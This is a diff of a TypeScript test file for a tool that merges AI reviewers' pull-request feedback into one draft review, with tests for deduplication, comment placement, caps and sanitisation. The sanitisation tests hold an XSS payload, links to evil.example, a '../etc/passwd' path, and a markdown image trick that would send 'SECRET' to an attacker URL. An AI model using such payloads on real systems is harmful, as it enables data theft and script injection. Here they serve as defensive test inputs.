@@ -1,235 +1,307 @@
+import {
+	FACTORY_REVIEW_DRAFT_LIMITS,
+	factoryReviewDraftSchema,
+} from "@cline/shared";
 import { describe, expect, it } from "vitest";
 import {
 	assembleFactoryReviewDraft,
-	FACTORY_REVIEW_DRAFT_LIMITS,
+	type FactoryPullRequestReview,
 	type FactoryReviewDraftReviewer,
+	factoryReviewDiffFiles,
 	factoryReviewDraftStale,
+	parseFactoryPullRequestReview,
 } from "./factory-review-draft";
 
 const HEAD = "0123456789abcdef0123456789abcdef01234567";
 const reviewer = (
 	reviewerIndex: number,
-	review: Partial<FactoryReviewDraftReviewer["review"]> = {},
+	review: Partial<FactoryPullRequestReview> = {},
 ): FactoryReviewDraftReviewer => ({
 	reviewerIndex,
 	review: {
-		verdict: "pass",
+		verdict: "approve",
 		summary: "Looks fine.",
+		comments: [],
 		findings: [],
+		questions: [],
+		notChecked: [],
 		...review,
 	},
 });
+const anywhere = (path: string) => ({
+	path,
+	ranges: [{ start: 1, end: 10_000 }],
+});
+const assemble = (
+	reviewers: FactoryReviewDraftReviewer[],
+	files = [anywhere("src/a.ts")],
+) => {
+	const draft = assembleFactoryReviewDraft({ headSha: HEAD, reviewers, files });
+	// Every draft is one the run state accepts.
+	expect(factoryReviewDraftSchema.parse(draft)).toEqual(draft);
+	return draft;
+};
 
 describe("assembleFactoryReviewDraft", () => {
-	it("suggests approval only when every reviewer passed with no findings", () => {
-		const clean = assembleFactoryReviewDraft({
-			headSha: HEAD,
-			reviewers: [reviewer(0), reviewer(1)],
-		});
-		expect(clean.verdict).toBe("approve_suggested");
-		expect(clean.comments).toEqual([]);
-		expect(clean.body).toContain("Approval is a suggestion");
+	it("suggests approval only when every reviewer approved with nothing found", () => {
+		expect(assemble([reviewer(0), reviewer(1)]).verdict).toBe(
+			"approve_suggested",
+		);
 		expect(
-			assembleFactoryReviewDraft({ headSha: HEAD, reviewers: [] }).verdict,
+			assemble([reviewer(0), reviewer(1, { findings: ["Rename x."] })]).verdict,
 		).toBe("comment");
 		expect(
-			assembleFactoryReviewDraft({
-				headSha: HEAD,
-				reviewers: [reviewer(0), reviewer(1, { findings: ["Nit: rename x."] })],
-			}).verdict,
-		).toBe("comment");
-		expect(
-			assembleFactoryReviewDraft({
-				headSha: HEAD,
-				reviewers: [
-					reviewer(0),
-					reviewer(1, {
-						verdict: "changes_requested",
-						summary: "Broken.",
-						findings: ["The parser drops the last token."],
-					}),
-				],
-			}).verdict,
+			assemble([
+				reviewer(0),
+				reviewer(1, { verdict: "request_changes", summary: "Broken." }),
+			]).verdict,
 		).toBe("request_changes");
 	});
 
-	it("merges duplicate findings across reviewers by location and by text", () => {
-		const draft = assembleFactoryReviewDraft({
-			headSha: HEAD,
-			files: [{ path: "src/parser.ts" }],
-			reviewers: [
+	it("keeps a reviewer's whole summary in the body", () => {
+		const summary = `${"The change is sound. ".repeat(60)}No blocking issue.`;
+		expect(assemble([reviewer(0, { summary })]).body).toContain(
+			"No blocking issue.",
+		);
+	});
+
+	it("merges duplicates across reviewers at the highest severity, without attribution in the body", () => {
+		const draft = assemble(
+			[
 				reviewer(0, {
-					verdict: "changes_requested",
+					verdict: "request_changes",
 					findings: [
 						"The parser drops the last token when input ends without a newline.",
-						"Missing test for empty input.",
 					],
-					locations: [
+					comments: [
 						{
 							path: "src/parser.ts",
 							line: 12,
+							severity: "minor",
 							body: "Off-by-one: the loop stops early.",
 						},
 					],
+					questions: ["Is empty input valid?"],
 				}),
 				reviewer(1, {
-					verdict: "changes_requested",
+					verdict: "comment",
 					findings: [
 						"the parser drops the last token when input ends without a newline!",
 						"Off-by-one: the loop stops early.",
 					],
-					locations: [
+					comments: [
 						{
 							path: "src/parser.ts",
 							line: 12,
+							severity: "blocker",
 							body: "Loop bound should be <= length.",
 						},
 					],
+					questions: ["is empty input valid"],
 				}),
 			],
-		});
+			[anywhere("src/parser.ts")],
+		);
 		expect(draft.comments).toEqual([
 			{
+				id: "c1",
 				path: "src/parser.ts",
 				line: 12,
-				body: "Off-by-one: the loop stops early.\n\nLoop bound should be &lt;= length.",
+				side: "RIGHT",
+				severity: "blocker",
+				body: "Off-by-one: the loop stops early.\n\nLoop bound should be <= length.",
 				reviewers: ["Reviewer 1", "Reviewer 2"],
 			},
 		]);
-		expect(draft.body).toContain(
-			"- The parser drops the last token when input ends without a newline. (Reviewer 1, Reviewer 2)",
-		);
-		expect(draft.body).toContain(
-			"- Missing test for empty input. (Reviewer 1)",
-		);
-		expect(draft.dropped.map((entry) => entry.reason)).toEqual([
-			"duplicate",
-			"duplicate",
+		expect(draft.findings).toEqual([
+			{
+				text: "The parser drops the last token when input ends without a newline.",
+				reviewers: ["Reviewer 1", "Reviewer 2"],
+			},
 		]);
+		expect(draft.questions).toEqual(["Is empty input valid?"]);
+		expect(draft.body).toContain(
+			"- The parser drops the last token when input ends without a newline.",
+		);
+		expect(draft.body).not.toMatch(/Reviewer \d|Factory|Cline/);
 	});
 
-	it("keeps inline only comments on PR files and covered lines; the rest go into the body", () => {
-		const draft = assembleFactoryReviewDraft({
-			headSha: HEAD,
-			files: [
-				{ path: "src/a.ts", ranges: [{ start: 10, end: 20 }] },
-				{ path: "src/b.ts" },
-			],
-			reviewers: [
+	it("keeps a comment inline only on a line its file's hunks cover; the rest become findings", () => {
+		const diff = [
+			"diff --git a/src/a.ts b/src/a.ts",
+			"--- a/src/a.ts",
+			"+++ b/src/a.ts",
+			"@@ -8,3 +10,11 @@ export function a() {",
+			"diff --git a/src/gone.ts b/src/gone.ts",
+			"--- a/src/gone.ts",
+			"+++ /dev/null",
+			"@@ -1,4 +0,0 @@",
+		].join("\n");
+		const files = factoryReviewDiffFiles(diff);
+		expect(files).toEqual([
+			{ path: "src/a.ts", ranges: [{ start: 10, end: 20 }] },
+		]);
+		const draft = assemble(
+			[
 				reviewer(0, {
-					findings: [],
-					locations: [
-						{ path: "src/a.ts", line: 15, body: "Inside the hunk." },
-						{ path: "src/a.ts", line: 40, body: "Outside the hunk." },
-						{ path: "./src/b.ts", line: 3, body: "Any line of a listed file." },
-						{ path: "src/other.ts", line: 1, body: "Not in this PR." },
-						{ path: "../etc/passwd", line: 1, body: "Escapes." },
-						{ path: "src/a.ts", line: 0, body: "No line." },
-						{ path: "src/a.ts", line: 11, body: "   " },
+					comments: [
+						{ path: "src/a.ts", line: 15, severity: "major", body: "In." },
+						{ path: "src/a.ts", line: 40, severity: "minor", body: "Out." },
+						{ path: "src/gone.ts", line: 1, severity: "nit", body: "Gone." },
+						{ path: "../etc/passwd", line: 1, severity: "nit", body: "Up." },
+						{ path: "src/a.ts", line: 0, severity: "nit", body: "Zero." },
+						{ path: "src/a.ts", line: 11, severity: "nit", body: "   " },
 					],
 				}),
 			],
-		});
+			files,
+		);
 		expect(draft.comments.map((c) => `${c.path}:${c.line}`)).toEqual([
 			"src/a.ts:15",
-			"src/b.ts:3",
 		]);
-		expect(draft.body).toContain(
-			"- src/a.ts:40: Outside the hunk. (Reviewer 1)",
-		);
-		expect(draft.body).toContain(
-			"- src/other.ts:1: Not in this PR. (Reviewer 1)",
-		);
+		expect(draft.findings.map((entry) => entry.text)).toEqual([
+			"src/a.ts:40: Out.",
+			"src/gone.ts:1: Gone.",
+		]);
 		expect(draft.dropped.map((entry) => entry.reason)).toEqual([
 			"invalid_location",
 			"invalid_location",
 			"empty",
 		]);
-		// Without a diff, nothing is placed inline.
-		expect(
-			assembleFactoryReviewDraft({
-				headSha: HEAD,
-				reviewers: [
-					reviewer(0, {
-						locations: [{ path: "src/a.ts", line: 15, body: "Inside." }],
-					}),
-				],
-			}).comments,
-		).toEqual([]);
 	});
 
-	it("caps comments, body findings and lengths", () => {
+	it("caps comments, findings and lengths, keeping the most severe comments", () => {
 		const limits = FACTORY_REVIEW_DRAFT_LIMITS;
-		const locations = Array.from({ length: limits.comments + 5 }, (_, i) => ({
+		const comments = Array.from({ length: limits.comments + 5 }, (_, i) => ({
 			path: "src/a.ts",
 			line: i + 1,
-			body: `Distinct comment number ${i} about ${"z".repeat(i)}`,
+			severity: i < 5 ? ("nit" as const) : ("major" as const),
+			body: `Distinct comment number ${i} about ${"z".repeat(i)} ${"x ".repeat(2_000)}`,
 		}));
 		const findings = Array.from(
 			{ length: limits.bodyFindings + 10 },
 			(_, i) => `Finding ${i} ${"q".repeat(i + 1)} ${"long ".repeat(400)}`,
 		);
-		const draft = assembleFactoryReviewDraft({
-			headSha: HEAD,
-			files: [{ path: "src/a.ts" }],
-			reviewers: [reviewer(0, { findings, locations })],
-		});
+		const draft = assemble([reviewer(0, { findings, comments })]);
 		expect(draft.comments).toHaveLength(limits.comments);
+		expect(draft.comments.every((c) => c.severity === "major")).toBe(true);
+		expect(draft.findings).toHaveLength(limits.bodyFindings);
 		expect(
-			draft.body.split("\n").filter((line) => line.startsWith("- Finding")),
-		).toHaveLength(limits.bodyFindings);
-		expect(draft.body).toContain("- 15 more findings in Factory");
-		expect(draft.body.length).toBeLessThanOrEqual(limits.bodyChars);
-		for (const line of draft.body.split("\n"))
-			expect(line.length).toBeLessThan(limits.findingChars + 100);
-		expect(
-			draft.dropped.filter((entry) => entry.reason === "limit"),
-		).toHaveLength(15);
+			draft.dropped.filter((entry) => entry.reason === "limit").length,
+		).toBeGreaterThan(0);
 	});
 
-	it("sanitises mentions, references, links, images and HTML like the PR evidence", () => {
-		const draft = assembleFactoryReviewDraft({
-			headSha: HEAD,
-			files: [{ path: "src/a.ts" }],
-			reviewers: [
-				{
-					reviewerIndex: 0,
-					label: "@security-team",
-					review: {
-						verdict: "changes_requested",
-						summary: "See [details](https://evil.example) <script>x</script>",
-						findings: [
-							"Ping @octocat about #123 ![img](https://evil.example/i.png)",
-						],
-						locations: [
-							{
-								path: "src/a.ts",
-								line: 2,
-								body: "<img src=x onerror=alert(1)> fixes #9",
-							},
-						],
-					},
+	it("makes links, images and HTML inert, and leaves mentions and references as written", () => {
+		const draft = assemble([
+			{
+				reviewerIndex: 0,
+				label: "@security-team",
+				review: {
+					verdict: "request_changes",
+					summary: "See [details](https://evil.example) <script>x</script>",
+					findings: [
+						"Ping @octocat about #123 ![img](https://evil.example/i.png)",
+					],
+					comments: [
+						{
+							path: "src/a.ts",
+							line: 2,
+							severity: "major",
+							body: "<img src=x onerror=alert(1)> fixes #9",
+						},
+					],
+					questions: [],
+					notChecked: [],
 				},
-			],
-		});
+			},
+		]);
 		const text = `${draft.body}\n${draft.comments.map((c) => `${c.body} ${c.reviewers}`).join("\n")}`;
-		expect(text).not.toMatch(/@[a-z]/i);
-		expect(text).not.toMatch(/(?<!&)#\d/);
-		expect(text).not.toContain("https://evil.example");
-		expect(text).not.toContain("<script");
-		expect(text).not.toContain("<img");
-		expect(draft.body).toContain("See details &lt;script>");
+		expect(text).toContain("Ping @octocat about #123");
+		expect(text).toContain("fixes #9 @security-team");
+		expect(text).not.toMatch(/(?<!\\)(?:\\\\)*(?:!\[|\]\(|<[A-Za-z/]|:\/\/)/);
 	});
 
-	it("ends with a footer naming the reviewers and the commit", () => {
-		const draft = assembleFactoryReviewDraft({
-			headSha: HEAD.toUpperCase(),
-			reviewers: [reviewer(0), { ...reviewer(1), label: "Security" }],
-		});
-		expect(draft.headSha).toBe(HEAD);
-		expect(draft.body.split("\n").at(-1)).toBe(
-			"<sub>Draft by Cline Factory: Reviewer 1, Security reviewed commit `0123456789ab`.</sub>",
-		);
+	it("cannot be made to fetch anything, even by comments merged on one line", () => {
+		const secret = "https://evil.example/c?d=SECRET";
+		const draft = assemble([
+			reviewer(0, {
+				comments: [
+					{
+						path: "src/a.ts",
+						line: 3,
+						severity: "major",
+						body: "Looks odd here ![s]",
+					},
+				],
+				findings: [`[t]: ${secret}`],
+			}),
+			reviewer(1, {
+				comments: [
+					{
+						path: "src/a.ts",
+						line: 3,
+						severity: "minor",
+						body: `[s]: ${secret}`,
+					},
+				],
+				questions: ["Why ![t] here?"],
+			}),
+		]);
+		const [comment] = draft.comments;
+		expect(comment?.reviewers).toHaveLength(2);
+		for (const text of [comment?.body ?? "", draft.body]) {
+			// No image opener survives, and no line defines a link target.
+			expect(text).not.toMatch(/(?<!\\)!\[/);
+			// A label closes only at an unescaped `]`.
+			expect(text).not.toMatch(/^ {0,3}(?:[-*>] *)?\[(?:[^\]\\]|\\.)*\]:/m);
+		}
+	});
+
+	it("reads file headers only between a diff line and its first hunk", () => {
+		const diff = [
+			"diff --git a/src/a.ts b/src/a.ts",
+			"--- a/src/a.ts",
+			"+++ b/src/a.ts",
+			"@@ -1,2 +1,4 @@",
+			" const a = 1;",
+			"--- a/old",
+			"+++ b/src/made-up.ts",
+			"+const b = 2;",
+		].join("\n");
+		expect(factoryReviewDiffFiles(diff)).toEqual([
+			{ path: "src/a.ts", ranges: [{ start: 1, end: 4 }] },
+		]);
+	});
+
+	it("records a reviewer that did not finish and drafts from the rest", () => {
+		const draft = assemble([
+			reviewer(0, { verdict: "comment", findings: ["Name the timeout."] }),
+			{ reviewerIndex: 1, error: "Factory reviewer retry limit reached" },
+		]);
+		expect(draft.reviewers).toEqual([
+			expect.objectContaining({ reviewerIndex: 0, verdict: "comment" }),
+			{
+				reviewerIndex: 1,
+				label: "Reviewer 2",
+				summary: "Did not finish: Factory reviewer retry limit reached",
+				failed: true,
+			},
+		]);
+		expect(draft.verdict).toBe("comment");
+	});
+});
+
+describe("parseFactoryPullRequestReview", () => {
+	it("accepts the reviewer's JSON and refuses anything else", () => {
+		expect(
+			parseFactoryPullRequestReview(
+				'Done.\n```json\n{"verdict":"comment","summary":"Fine."}\n```',
+			),
+		).toMatchObject({ verdict: "comment", comments: [], findings: [] });
+		expect(() =>
+			parseFactoryPullRequestReview('{"verdict":"merge","summary":"x"}'),
+		).toThrow();
+		expect(() => parseFactoryPullRequestReview("Looks good to me")).toThrow();
 	});
 });
 
